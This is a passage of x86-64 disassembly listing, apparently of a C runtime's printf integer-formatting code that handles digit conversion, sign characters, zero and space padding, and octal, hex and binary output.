   32c482b29:	48 83 f8 03          	cmp    $0x3,%rax
   32c482b2d:	75 11                	jne    0x32c482b40
   32c482b2f:	41 c6 00 2c          	movb   $0x2c,(%r8)
   32c482b33:	49 83 c0 01          	add    $0x1,%r8
   32c482b37:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   32c482b3e:	00 00 
   32c482b40:	48 89 c8             	mov    %rcx,%rax
   32c482b43:	4d 8d 60 01          	lea    0x1(%r8),%r12
   32c482b47:	49 f7 e2             	mul    %r10
   32c482b4a:	48 89 c8             	mov    %rcx,%rax
   32c482b4d:	48 c1 ea 03          	shr    $0x3,%rdx
   32c482b51:	4c 8d 3c 92          	lea    (%rdx,%rdx,4),%r15
   32c482b55:	4d 01 ff             	add    %r15,%r15
   32c482b58:	4c 29 f8             	sub    %r15,%rax
   32c482b5b:	83 c0 30             	add    $0x30,%eax
   32c482b5e:	41 88 00             	mov    %al,(%r8)
   32c482b61:	48 83 f9 09          	cmp    $0x9,%rcx
   32c482b65:	76 09                	jbe    0x32c482b70
   32c482b67:	48 89 d1             	mov    %rdx,%rcx
   32c482b6a:	4d 89 e0             	mov    %r12,%r8
   32c482b6d:	eb a1                	jmp    0x32c482b10
   32c482b6f:	90                   	nop
   32c482b70:	45 85 ed             	test   %r13d,%r13d
   32c482b73:	0f 8e 47 02 00 00    	jle    0x32c482dc0
   32c482b79:	4c 89 e0             	mov    %r12,%rax
   32c482b7c:	44 89 ea             	mov    %r13d,%edx
   32c482b7f:	48 29 f8             	sub    %rdi,%rax
   32c482b82:	29 c2                	sub    %eax,%edx
   32c482b84:	85 d2                	test   %edx,%edx
   32c482b86:	0f 8e 9c 00 00 00    	jle    0x32c482c28
   32c482b8c:	8d 4a ff             	lea    -0x1(%rdx),%ecx
   32c482b8f:	83 f9 0e             	cmp    $0xe,%ecx
   32c482b92:	0f 8e 84 03 00 00    	jle    0x32c482f1c
   32c482b98:	41 89 d2             	mov    %edx,%r10d
   32c482b9b:	be 30 30 30 30       	mov    $0x30303030,%esi
   32c482ba0:	4c 89 e0             	mov    %r12,%rax
   32c482ba3:	41 c1 ea 04          	shr    $0x4,%r10d
   32c482ba7:	66 0f 6e c6          	movd   %esi,%xmm0
   32c482bab:	49 c1 e2 04          	shl    $0x4,%r10
   32c482baf:	66 0f 70 c0 00       	pshufd $0x0,%xmm0,%xmm0
   32c482bb4:	4f 8d 04 22          	lea    (%r10,%r12,1),%r8
   32c482bb8:	41 83 e2 10          	and    $0x10,%r10d
   32c482bbc:	74 12                	je     0x32c482bd0
   32c482bbe:	49 8d 44 24 10       	lea    0x10(%r12),%rax
   32c482bc3:	41 0f 11 04 24       	movups %xmm0,(%r12)
   32c482bc8:	4c 39 c0             	cmp    %r8,%rax
   32c482bcb:	74 13                	je     0x32c482be0
   32c482bcd:	0f 1f 00             	nopl   (%rax)
   32c482bd0:	0f 11 00             	movups %xmm0,(%rax)
   32c482bd3:	48 83 c0 20          	add    $0x20,%rax
   32c482bd7:	0f 11 40 f0          	movups %xmm0,-0x10(%rax)
   32c482bdb:	4c 39 c0             	cmp    %r8,%rax
   32c482bde:	75 f0                	jne    0x32c482bd0
   32c482be0:	89 d0                	mov    %edx,%eax
   32c482be2:	83 e0 f0             	and    $0xfffffff0,%eax
   32c482be5:	83 e2 0f             	and    $0xf,%edx
   32c482be8:	74 36                	je     0x32c482c20
   32c482bea:	41 89 c8             	mov    %ecx,%r8d
   32c482bed:	41 29 c0             	sub    %eax,%r8d
   32c482bf0:	4c 01 e0             	add    %r12,%rax
   32c482bf3:	4a 8d 54 00 01       	lea    0x1(%rax,%r8,1),%rdx
   32c482bf8:	41 83 e0 01          	and    $0x1,%r8d
   32c482bfc:	75 12                	jne    0x32c482c10
   32c482bfe:	48 83 c0 01          	add    $0x1,%rax
   32c482c02:	c6 40 ff 30          	movb   $0x30,-0x1(%rax)
   32c482c06:	48 39 d0             	cmp    %rdx,%rax
   32c482c09:	74 15                	je     0x32c482c20
   32c482c0b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   32c482c10:	c6 00 30             	movb   $0x30,(%rax)
   32c482c13:	48 83 c0 02          	add    $0x2,%rax
   32c482c17:	c6 40 ff 30          	movb   $0x30,-0x1(%rax)
   32c482c1b:	48 39 d0             	cmp    %rdx,%rax
   32c482c1e:	75 f0                	jne    0x32c482c10
   32c482c20:	48 63 c9             	movslq %ecx,%rcx
   32c482c23:	4d 8d 64 0c 01       	lea    0x1(%r12,%rcx,1),%r12
   32c482c28:	4c 39 e7             	cmp    %r12,%rdi
   32c482c2b:	0f 84 cf 01 00 00    	je     0x32c482e00
   32c482c31:	45 85 db             	test   %r11d,%r11d
   32c482c34:	7e 4a                	jle    0x32c482c80
   32c482c36:	4c 89 e0             	mov    %r12,%rax
   32c482c39:	48 29 f8             	sub    %rdi,%rax
   32c482c3c:	41 29 c3             	sub    %eax,%r11d
   32c482c3f:	44 89 5b 0c          	mov    %r11d,0xc(%rbx)
   32c482c43:	45 85 db             	test   %r11d,%r11d
   32c482c46:	7e 38                	jle    0x32c482c80
   32c482c48:	41 f7 c1 c0 01 00 00 	test   $0x1c0,%r9d
   32c482c4f:	74 08                	je     0x32c482c59
   32c482c51:	41 83 eb 01          	sub    $0x1,%r11d
   32c482c55:	44 89 5b 0c          	mov    %r11d,0xc(%rbx)
   32c482c59:	45 85 ed             	test   %r13d,%r13d
   32c482c5c:	79 13                	jns    0x32c482c71
   32c482c5e:	44 89 c8             	mov    %r9d,%eax
   32c482c61:	25 00 06 00 00       	and    $0x600,%eax
   32c482c66:	3d 00 02 00 00       	cmp    $0x200,%eax
   32c482c6b:	0f 84 fb 01 00 00    	je     0x32c482e6c
   32c482c71:	41 f7 c1 00 04 00 00 	test   $0x400,%r9d
   32c482c78:	0f 84 92 01 00 00    	je     0x32c482e10
   32c482c7e:	66 90                	xchg   %ax,%ax
   32c482c80:	41 f6 c1 80          	test   $0x80,%r9b
   32c482c84:	0f 84 ce 00 00 00    	je     0x32c482d58
   32c482c8a:	41 c6 04 24 2d       	movb   $0x2d,(%r12)
   32c482c8f:	49 8d 74 24 01       	lea    0x1(%r12),%rsi
   32c482c94:	48 39 f7             	cmp    %rsi,%rdi
   32c482c97:	72 20                	jb     0x32c482cb9
   32c482c99:	eb 66                	jmp    0x32c482d01
   32c482c9b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   32c482ca0:	48 63 43 24          	movslq 0x24(%rbx),%rax
   32c482ca4:	88 0c 02             	mov    %cl,(%rdx,%rax,1)
   32c482ca7:	8b 43 24             	mov    0x24(%rbx),%eax
   32c482caa:	83 c0 01             	add    $0x1,%eax
   32c482cad:	89 43 24             	mov    %eax,0x24(%rbx)
   32c482cb0:	48 39 f7             	cmp    %rsi,%rdi
   32c482cb3:	74 4c                	je     0x32c482d01
   32c482cb5:	44 8b 4b 08          	mov    0x8(%rbx),%r9d
   32c482cb9:	48 83 ee 01          	sub    $0x1,%rsi
   32c482cbd:	41 f7 c1 00 40 00 00 	test   $0x4000,%r9d
   32c482cc4:	75 08                	jne    0x32c482cce
   32c482cc6:	8b 43 24             	mov    0x24(%rbx),%eax
   32c482cc9:	39 43 28             	cmp    %eax,0x28(%rbx)
   32c482ccc:	7e dc                	jle    0x32c482caa
   32c482cce:	41 81 e1 00 20 00 00 	and    $0x2000,%r9d
   32c482cd5:	0f be 0e             	movsbl (%rsi),%ecx
   32c482cd8:	48 8b 13             	mov    (%rbx),%rdx
   32c482cdb:	74 c3                	je     0x32c482ca0
   32c482cdd:	e8 9e 57 00 00       	call   0x32c488480
   32c482ce2:	8b 43 24             	mov    0x24(%rbx),%eax
   32c482ce5:	eb c3                	jmp    0x32c482caa
   32c482ce7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   32c482cee:	00 00 
   32c482cf0:	48 63 53 24          	movslq 0x24(%rbx),%rdx
   32c482cf4:	c6 04 10 20          	movb   $0x20,(%rax,%rdx,1)
   32c482cf8:	8b 43 24             	mov    0x24(%rbx),%eax
   32c482cfb:	83 c0 01             	add    $0x1,%eax
   32c482cfe:	89 43 24             	mov    %eax,0x24(%rbx)
   32c482d01:	8b 43 0c             	mov    0xc(%rbx),%eax
   32c482d04:	8d 50 ff             	lea    -0x1(%rax),%edx
   32c482d07:	89 53 0c             	mov    %edx,0xc(%rbx)
   32c482d0a:	85 c0                	test   %eax,%eax
   32c482d0c:	7e 32                	jle    0x32c482d40
   32c482d0e:	8b 53 08             	mov    0x8(%rbx),%edx
   32c482d11:	f6 c6 40             	test   $0x40,%dh
   32c482d14:	75 08                	jne    0x32c482d1e
   32c482d16:	8b 43 24             	mov    0x24(%rbx),%eax
   32c482d19:	39 43 28             	cmp    %eax,0x28(%rbx)
   32c482d1c:	7e dd                	jle    0x32c482cfb
   32c482d1e:	48 8b 03             	mov    (%rbx),%rax
   32c482d21:	80 e6 20             	and    $0x20,%dh
   32c482d24:	74 ca                	je     0x32c482cf0
   32c482d26:	48 89 c2             	mov    %rax,%rdx
   32c482d29:	b9 20 00 00 00       	mov    $0x20,%ecx
   32c482d2e:	e8 4d 57 00 00       	call   0x32c488480
   32c482d33:	8b 43 24             	mov    0x24(%rbx),%eax
   32c482d36:	eb c3                	jmp    0x32c482cfb
   32c482d38:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   32c482d3f:	00 
   32c482d40:	48 8d 65 08          	lea    0x8(%rbp),%rsp
   32c482d44:	5b                   	pop    %rbx
   32c482d45:	5e                   	pop    %rsi
   32c482d46:	5f                   	pop    %rdi
   32c482d47:	41 5c                	pop    %r12
   32c482d49:	41 5d                	pop    %r13
   32c482d4b:	41 5e                	pop    %r14
   32c482d4d:	41 5f                	pop    %r15
   32c482d4f:	5d                   	pop    %rbp
   32c482d50:	c3                   	ret
   32c482d51:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   32c482d58:	41 f7 c1 00 01 00 00 	test   $0x100,%r9d
   32c482d5f:	74 2f                	je     0x32c482d90
   32c482d61:	41 c6 04 24 2b       	movb   $0x2b,(%r12)
   32c482d66:	49 8d 74 24 01       	lea    0x1(%r12),%rsi
   32c482d6b:	e9 24 ff ff ff       	jmp    0x32c482c94
   32c482d70:	89 c2                	mov    %eax,%edx
   32c482d72:	41 b8 ab aa aa aa    	mov    $0xaaaaaaab,%r8d
   32c482d78:	49 0f af d0          	imul   %r8,%rdx
   32c482d7c:	48 c1 ea 21          	shr    $0x21,%rdx
   32c482d80:	01 d0                	add    %edx,%eax
   32c482d82:	e9 19 fd ff ff       	jmp    0x32c482aa0
   32c482d87:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   32c482d8e:	00 00 
   32c482d90:	4c 89 e6             	mov    %r12,%rsi
   32c482d93:	41 f6 c1 40          	test   $0x40,%r9b
   32c482d97:	0f 84 f7 fe ff ff    	je     0x32c482c94
   32c482d9d:	41 c6 04 24 20       	movb   $0x20,(%r12)
   32c482da2:	48 83 c6 01          	add    $0x1,%rsi
   32c482da6:	e9 e9 fe ff ff       	jmp    0x32c482c94
   32c482dab:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   32c482db0:	48 f7 d9             	neg    %rcx
   32c482db3:	e9 2a fd ff ff       	jmp    0x32c482ae2
   32c482db8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   32c482dbf:	00 
   32c482dc0:	4c 39 e7             	cmp    %r12,%rdi
   32c482dc3:	0f 85 68 fe ff ff    	jne    0x32c482c31
   32c482dc9:	45 85 ed             	test   %r13d,%r13d
   32c482dcc:	75 32                	jne    0x32c482e00
   32c482dce:	45 85 db             	test   %r11d,%r11d
   32c482dd1:	0f 8e a9 fe ff ff    	jle    0x32c482c80
   32c482dd7:	44 89 5b 0c          	mov    %r11d,0xc(%rbx)
   32c482ddb:	41 f7 c1 c0 01 00 00 	test   $0x1c0,%r9d
   32c482de2:	0f 85 27 01 00 00    	jne    0x32c482f0f
   32c482de8:	41 f7 c1 00 04 00 00 	test   $0x400,%r9d
   32c482def:	0f 85 8b fe ff ff    	jne    0x32c482c80
   32c482df5:	83 6b 0c 01          	subl   $0x1,0xc(%rbx)
   32c482df9:	eb 35                	jmp    0x32c482e30
   32c482dfb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   32c482e00:	41 c6 04 24 30       	movb   $0x30,(%r12)
   32c482e05:	49 83 c4 01          	add    $0x1,%r12
   32c482e09:	e9 23 fe ff ff       	jmp    0x32c482c31
   32c482e0e:	66 90                	xchg   %ax,%ax
   32c482e10:	8b 43 0c             	mov    0xc(%rbx),%eax
   32c482e13:	8d 50 ff             	lea    -0x1(%rax),%edx
   32c482e16:	89 53 0c             	mov    %edx,0xc(%rbx)
   32c482e19:	85 c0                	test   %eax,%eax
   32c482e1b:	0f 8e 5f fe ff ff    	jle    0x32c482c80
   32c482e21:	0f 1f 40 00          	nopl   0x0(%rax)
   32c482e25:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   32c482e2c:	00 00 00 00 
   32c482e30:	48 89 da             	mov    %rbx,%rdx
   32c482e33:	b9 20 00 00 00       	mov    $0x20,%ecx
   32c482e38:	e8 03 f8 ff ff       	call   0x32c482640
   32c482e3d:	8b 43 0c             	mov    0xc(%rbx),%eax
   32c482e40:	8d 50 ff             	lea    -0x1(%rax),%edx
   32c482e43:	89 53 0c             	mov    %edx,0xc(%rbx)
   32c482e46:	85 c0                	test   %eax,%eax
   32c482e48:	7f e6                	jg     0x32c482e30
   32c482e4a:	44 8b 4b 08          	mov    0x8(%rbx),%r9d
   32c482e4e:	e9 2d fe ff ff       	jmp    0x32c482c80
   32c482e53:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   32c482e58:	49 89 fc             	mov    %rdi,%r12
   32c482e5b:	44 89 ea             	mov    %r13d,%edx
   32c482e5e:	45 85 ed             	test   %r13d,%r13d
   32c482e61:	0f 8f 25 fd ff ff    	jg     0x32c482b8c
   32c482e67:	e9 5d ff ff ff       	jmp    0x32c482dc9
   32c482e6c:	4c 63 43 0c          	movslq 0xc(%rbx),%r8
   32c482e70:	41 8d 50 ff          	lea    -0x1(%r8),%edx
   32c482e74:	89 53 0c             	mov    %edx,0xc(%rbx)
   32c482e77:	45 85 c0             	test   %r8d,%r8d
   32c482e7a:	0f 8e 00 fe ff ff    	jle    0x32c482c80
   32c482e80:	4c 89 e0             	mov    %r12,%rax
   32c482e83:	83 fa 0e             	cmp    $0xe,%edx
   32c482e86:	76 59                	jbe    0x32c482ee1
   32c482e88:	45 89 c2             	mov    %r8d,%r10d
   32c482e8b:	be 30 30 30 30       	mov    $0x30303030,%esi
   32c482e90:	41 c1 ea 04          	shr    $0x4,%r10d
   32c482e94:	66 0f 6e c6          	movd   %esi,%xmm0
   32c482e98:	49 c1 e2 04          	shl    $0x4,%r10
   32c482e9c:	66 0f 70 c0 00       	pshufd $0x0,%xmm0,%xmm0
   32c482ea1:	4b 8d 0c 22          	lea    (%r10,%r12,1),%rcx
   32c482ea5:	41 83 e2 10          	and    $0x10,%r10d
   32c482ea9:	74 15                	je     0x32c482ec0
   32c482eab:	49 8d 44 24 10       	lea    0x10(%r12),%rax
   32c482eb0:	41 0f 11 04 24       	movups %xmm0,(%r12)
   32c482eb5:	48 39 c8             	cmp    %rcx,%rax
   32c482eb8:	74 16                	je     0x32c482ed0
   32c482eba:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   32c482ec0:	0f 11 00             	movups %xmm0,(%rax)
   32c482ec3:	48 83 c0 20          	add    $0x20,%rax
   32c482ec7:	0f 11 40 f0          	movups %xmm0,-0x10(%rax)
   32c482ecb:	48 39 c8             	cmp    %rcx,%rax
   32c482ece:	75 f0                	jne    0x32c482ec0
   32c482ed0:	44 89 c0             	mov    %r8d,%eax
   32c482ed3:	83 e0 f0             	and    $0xfffffff0,%eax
   32c482ed6:	41 f6 c0 0f          	test   $0xf,%r8b
   32c482eda:	74 24                	je     0x32c482f00
   32c482edc:	29 c2                	sub    %eax,%edx
   32c482ede:	4c 01 e0             	add    %r12,%rax
   32c482ee1:	8d 4c 02 01          	lea    0x1(%rdx,%rax,1),%ecx
   32c482ee5:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   32c482eec:	00 00 00 00 
   32c482ef0:	48 83 c0 01          	add    $0x1,%rax
   32c482ef4:	89 ca                	mov    %ecx,%edx
   32c482ef6:	c6 40 ff 30          	movb   $0x30,-0x1(%rax)
   32c482efa:	29 c2                	sub    %eax,%edx
   32c482efc:	85 d2                	test   %edx,%edx
   32c482efe:	7f f0                	jg     0x32c482ef0
   32c482f00:	c7 43 0c ff ff ff ff 	movl   $0xffffffff,0xc(%rbx)
   32c482f07:	4d 01 c4             	add    %r8,%r12
   32c482f0a:	e9 71 fd ff ff       	jmp    0x32c482c80
   32c482f0f:	41 83 eb 01          	sub    $0x1,%r11d
   32c482f13:	44 89 5b 0c          	mov    %r11d,0xc(%rbx)
   32c482f17:	e9 55 fd ff ff       	jmp    0x32c482c71
   32c482f1c:	41 89 c8             	mov    %ecx,%r8d
   32c482f1f:	4c 89 e0             	mov    %r12,%rax
   32c482f22:	e9 cc fc ff ff       	jmp    0x32c482bf3
   32c482f27:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   32c482f2e:	00 00 
   32c482f30:	55                   	push   %rbp
   32c482f31:	41 57                	push   %r15
   32c482f33:	41 56                	push   %r14
   32c482f35:	41 55                	push   %r13
   32c482f37:	41 54                	push   %r12
   32c482f39:	57                   	push   %rdi
   32c482f3a:	56                   	push   %rsi
   32c482f3b:	53                   	push   %rbx
   32c482f3c:	48 83 ec 38          	sub    $0x38,%rsp
   32c482f40:	48 8d 6c 24 30       	lea    0x30(%rsp),%rbp
   32c482f45:	41 89 cb             	mov    %ecx,%r11d
   32c482f48:	49 89 d1             	mov    %rdx,%r9
   32c482f4b:	4c 89 c3             	mov    %r8,%rbx
   32c482f4e:	83 f9 62             	cmp    $0x62,%ecx
   32c482f51:	0f 84 19 07 00 00    	je     0x32c483670
   32c482f57:	83 f9 6f             	cmp    $0x6f,%ecx
   32c482f5a:	0f 84 d0 01 00 00    	je     0x32c483130
   32c482f60:	83 f9 42             	cmp    $0x42,%ecx
   32c482f63:	0f 84 f7 04 00 00    	je     0x32c483460
   32c482f69:	45 8b 68 10          	mov    0x10(%r8),%r13d
   32c482f6d:	31 c0                	xor    %eax,%eax
   32c482f6f:	45 8b 60 08          	mov    0x8(%r8),%r12d
   32c482f73:	45 85 ed             	test   %r13d,%r13d
   32c482f76:	44 89 e2             	mov    %r12d,%edx
   32c482f79:	41 0f 49 c5          	cmovns %r13d,%eax
   32c482f7d:	83 c0 12             	add    $0x12,%eax
   32c482f80:	41 f7 c4 00 10 00 00 	test   $0x1000,%r12d
   32c482f87:	0f 85 13 05 00 00    	jne    0x32c4834a0
   32c482f8d:	8b 7b 0c             	mov    0xc(%rbx),%edi
   32c482f90:	39 c7                	cmp    %eax,%edi
   32c482f92:	89 7d fc             	mov    %edi,-0x4(%rbp)
   32c482f95:	0f 4d c7             	cmovge %edi,%eax
   32c482f98:	48 98                	cltq
   32c482f9a:	48 83 c0 0f          	add    $0xf,%rax
   32c482f9e:	48 83 e0 f0          	and    $0xfffffffffffffff0,%rax
   32c482fa2:	e8 d9 f4 ff ff       	call   0x32c482480
   32c482fa7:	b9 04 00 00 00       	mov    $0x4,%ecx
   32c482fac:	48 29 c4             	sub    %rax,%rsp
   32c482faf:	48 8d 7c 24 20       	lea    0x20(%rsp),%rdi
   32c482fb4:	41 b8 0f 00 00 00    	mov    $0xf,%r8d
   32c482fba:	4d 85 c9             	test   %r9,%r9
   32c482fbd:	0f 85 c7 01 00 00    	jne    0x32c48318a
   32c482fc3:	41 81 e4 ff f7 ff ff 	and    $0xfffff7ff,%r12d
   32c482fca:	48 89 fe             	mov    %rdi,%rsi
   32c482fcd:	44 89 e9             	mov    %r13d,%ecx
   32c482fd0:	44 89 63 08          	mov    %r12d,0x8(%rbx)
   32c482fd4:	45 85 ed             	test   %r13d,%r13d
   32c482fd7:	0f 8f aa 02 00 00    	jg     0x32c483287
   32c482fdd:	0f 84 fc 05 00 00    	je     0x32c4835df
   32c482fe3:	66 90                	xchg   %ax,%ax
   32c482fe5:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   32c482fec:	00 00 00 00 
   32c482ff0:	c6 06 30             	movb   $0x30,(%rsi)
   32c482ff3:	48 83 c6 01          	add    $0x1,%rsi
   32c482ff7:	48 89 f0             	mov    %rsi,%rax
   32c482ffa:	48 29 f8             	sub    %rdi,%rax
   32c482ffd:	89 c2                	mov    %eax,%edx
   32c482fff:	3b 45 fc             	cmp    -0x4(%rbp),%eax
   32c483002:	0f 8d 3a 03 00 00    	jge    0x32c483342
   32c483008:	44 8b 75 fc          	mov    -0x4(%rbp),%r14d
   32c48300c:	44 8b 63 08          	mov    0x8(%rbx),%r12d
   32c483010:	41 29 d6             	sub    %edx,%r14d
   32c483013:	44 89 e2             	mov    %r12d,%edx
   32c483016:	44 89 73 0c          	mov    %r14d,0xc(%rbx)
   32c48301a:	41 83 fb 6f          	cmp    $0x6f,%r11d
   32c48301e:	0f 85 84 03 00 00    	jne    0x32c4833a8
   32c483024:	45 85 ed             	test   %r13d,%r13d
   32c483027:	0f 88 b3 04 00 00    	js     0x32c4834e0
   32c48302d:	41 81 e4 00 04 00 00 	and    $0x400,%r12d
   32c483034:	0f 85 24 02 00 00    	jne    0x32c48325e
   32c48303a:	41 83 ee 01          	sub    $0x1,%r14d
   32c48303e:	66 90                	xchg   %ax,%ax
   32c483040:	48 89 da             	mov    %rbx,%rdx
   32c483043:	b9 20 00 00 00       	mov    $0x20,%ecx
   32c483048:	e8 f3 f5 ff ff       	call   0x32c482640
   32c48304d:	41 83 ee 01          	sub    $0x1,%r14d
   32c483051:	73 ed                	jae    0x32c483040
   32c483053:	48 39 f7             	cmp    %rsi,%rdi
   32c483056:	0f 83 b9 00 00 00    	jae    0x32c483115
   32c48305c:	8b 53 08             	mov    0x8(%rbx),%edx
   32c48305f:	41 bd fe ff ff ff    	mov    $0xfffffffe,%r13d
   32c483065:	41 be ff ff ff ff    	mov    $0xffffffff,%r14d
   32c48306b:	eb 1b                	jmp    0x32c483088
   32c48306d:	0f 1f 00             	nopl   (%rax)
   32c483070:	48 63 53 24          	movslq 0x24(%rbx),%rdx
   32c483074:	88 0c 10             	mov    %cl,(%rax,%rdx,1)
   32c483077:	8b 43 24             	mov    0x24(%rbx),%eax
   32c48307a:	83 c0 01             	add    $0x1,%eax
   32c48307d:	89 43 24             	mov    %eax,0x24(%rbx)
   32c483080:	48 39 f7             	cmp    %rsi,%rdi
   32c483083:	73 35                	jae    0x32c4830ba
   32c483085:	8b 53 08             	mov    0x8(%rbx),%edx
   32c483088:	48 83 ee 01          	sub    $0x1,%rsi
   32c48308c:	f6 c6 40             	test   $0x40,%dh
   32c48308f:	75 08                	jne    0x32c483099
   32c483091:	8b 43 24             	mov    0x24(%rbx),%eax
   32c483094:	39 43 28             	cmp    %eax,0x28(%rbx)
   32c483097:	7e e1                	jle    0x32c48307a
   32c483099:	0f be 0e             	movsbl (%rsi),%ecx
   32c48309c:	48 8b 03             	mov    (%rbx),%rax
   32c48309f:	80 e6 20             	and    $0x20,%dh
   32c4830a2:	74 cc                	je     0x32c483070
   32c4830a4:	48 89 c2             	mov    %rax,%rdx
   32c4830a7:	e8 d4 53 00 00       	call   0x32c488480
   32c4830ac:	8b 43 24             	mov    0x24(%rbx),%eax
   32c4830af:	83 c0 01             	add    $0x1,%eax
   32c4830b2:	89 43 24             	mov    %eax,0x24(%rbx)
   32c4830b5:	48 39 f7             	cmp    %rsi,%rdi
   32c4830b8:	72 cb                	jb     0x32c483085
   32c4830ba:	45 85 f6             	test   %r14d,%r14d
   32c4830bd:	7e 56                	jle    0x32c483115
   32c4830bf:	8b 53 08             	mov    0x8(%rbx),%edx
   32c4830c2:	eb 21                	jmp    0x32c4830e5
   32c4830c4:	0f 1f 40 00          	nopl   0x0(%rax)
   32c4830c8:	48 63 53 24          	movslq 0x24(%rbx),%rdx
   32c4830cc:	c6 04 10 20          	movb   $0x20,(%rax,%rdx,1)
   32c4830d0:	8b 43 24             	mov    0x24(%rbx),%eax
   32c4830d3:	83 c0 01             	add    $0x1,%eax
   32c4830d6:	89 43 24             	mov    %eax,0x24(%rbx)
   32c4830d9:	45 85 ed             	test   %r13d,%r13d
   32c4830dc:	74 37                	je     0x32c483115
   32c4830de:	8b 53 08             	mov    0x8(%rbx),%edx
   32c4830e1:	41 83 ed 01          	sub    $0x1,%r13d
   32c4830e5:	f6 c6 40             	test   $0x40,%dh
   32c4830e8:	75 08                	jne    0x32c4830f2
   32c4830ea:	8b 43 24             	mov    0x24(%rbx),%eax
   32c4830ed:	39 43 28             	cmp    %eax,0x28(%rbx)
   32c4830f0:	7e e1                	jle    0x32c4830d3
   32c4830f2:	48 8b 03             	mov    (%rbx),%rax
   32c4830f5:	80 e6 20             	and    $0x20,%dh
   32c4830f8:	74 ce                	je     0x32c4830c8
   32c4830fa:	48 89 c2             	mov    %rax,%rdx
   32c4830fd:	b9 20 00 00 00       	mov    $0x20,%ecx
   32c483102:	e8 79 53 00 00       	call   0x32c488480
   32c483107:	8b 43 24             	mov    0x24(%rbx),%eax
   32c48310a:	83 c0 01             	add    $0x1,%eax
   32c48310d:	89 43 24             	mov    %eax,0x24(%rbx)
   32c483110:	45 85 ed             	test   %r13d,%r13d
   32c483113:	75 c9                	jne    0x32c4830de
   32c483115:	48 8d 65 08          	lea    0x8(%rbp),%rsp
   32c483119:	5b                   	pop    %rbx
   32c48311a:	5e                   	pop    %rsi
   32c48311b:	5f                   	pop    %rdi
   32c48311c:	41 5c                	pop    %r12
   32c48311e:	41 5d                	pop    %r13
   32c483120:	41 5e                	pop    %r14
   32c483122:	41 5f                	pop    %r15
   32c483124:	5d                   	pop    %rbp
   32c483125:	c3                   	ret
   32c483126:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   32c48312d:	00 00 00 
   32c483130:	45 8b 68 10          	mov    0x10(%r8),%r13d
   32c483134:	31 c0                	xor    %eax,%eax
   32c483136:	45 8b 60 08          	mov    0x8(%r8),%r12d
   32c48313a:	45 85 ed             	test   %r13d,%r13d
   32c48313d:	44 89 e2             	mov    %r12d,%edx
   32c483140:	41 0f 49 c5          	cmovns %r13d,%eax
   32c483144:	83 c0 18             	add    $0x18,%eax
   32c483147:	41 f7 c4 00 10 00 00 	test   $0x1000,%r12d
   32c48314e:	0f 85 94 02 00 00    	jne    0x32c4833e8
   32c483154:	8b 7b 0c             	mov    0xc(%rbx),%edi
   32c483157:	39 f8                	cmp    %edi,%eax
   32c483159:	89 7d fc             	mov    %edi,-0x4(%rbp)
   32c48315c:	0f 4c c7             	cmovl  %edi,%eax
   32c48315f:	48 98                	cltq
   32c483161:	48 83 c0 0f          	add    $0xf,%rax
   32c483165:	48 83 e0 f0          	and    $0xfffffffffffffff0,%rax
   32c483169:	e8 12 f3 ff ff       	call   0x32c482480
   32c48316e:	b9 03 00 00 00       	mov    $0x3,%ecx
   32c483173:	48 29 c4             	sub    %rax,%rsp
   32c483176:	48 8d 7c 24 20       	lea    0x20(%rsp),%rdi
   32c48317b:	41 b8 07 00 00 00    	mov    $0x7,%r8d
   32c483181:	4d 85 c9             	test   %r9,%r9
   32c483184:	0f 84 70 05 00 00    	je     0x32c4836fa
   32c48318a:	45 89 da             	mov    %r11d,%r10d
   32c48318d:	48 89 fe             	mov    %rdi,%rsi
   32c483190:	41 83 e2 20          	and    $0x20,%r10d
   32c483194:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   32c48319b:	00 00 00 00 
   32c48319f:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   32c4831a6:	00 00 00 00 
   32c4831aa:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   32c4831b1:	00 00 00 00 
   32c4831b5:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   32c4831bc:	00 00 00 00 
   32c4831c0:	44 89 c0             	mov    %r8d,%eax
   32c4831c3:	49 89 f6             	mov    %rsi,%r14
   32c4831c6:	48 83 c6 01          	add    $0x1,%rsi
   32c4831ca:	44 21 c8             	and    %r9d,%eax
   32c4831cd:	44 8d 78 30          	lea    0x30(%rax),%r15d
   32c4831d1:	83 c0 37             	add    $0x37,%eax
   32c4831d4:	44 09 d0             	or     %r10d,%eax
   32c4831d7:	41 80 ff 39          	cmp    $0x39,%r15b
   32c4831db:	41 0f 46 c7          	cmovbe %r15d,%eax
   32c4831df:	49 d3 e9             	shr    %cl,%r9
   32c4831e2:	88 46 ff             	mov    %al,-0x1(%rsi)
   32c4831e5:	4d 85 c9             	test   %r9,%r9
   32c4831e8:	75 d6                	jne    0x32c4831c0
   32c4831ea:	48 39 fe             	cmp    %rdi,%rsi
   32c4831ed:	0f 84 7d 00 00 00    	je     0x32c483270
   32c4831f3:	45 85 ed             	test   %r13d,%r13d
   32c4831f6:	0f 8e 84 01 00 00    	jle    0x32c483380
   32c4831fc:	48 89 f0             	mov    %rsi,%rax
   32c4831ff:	44 89 e9             	mov    %r13d,%ecx
   32c483202:	48 29 f8             	sub    %rdi,%rax
   32c483205:	29 c1                	sub    %eax,%ecx
   32c483207:	85 c9                	test   %ecx,%ecx
   32c483209:	7f 7c                	jg     0x32c483287
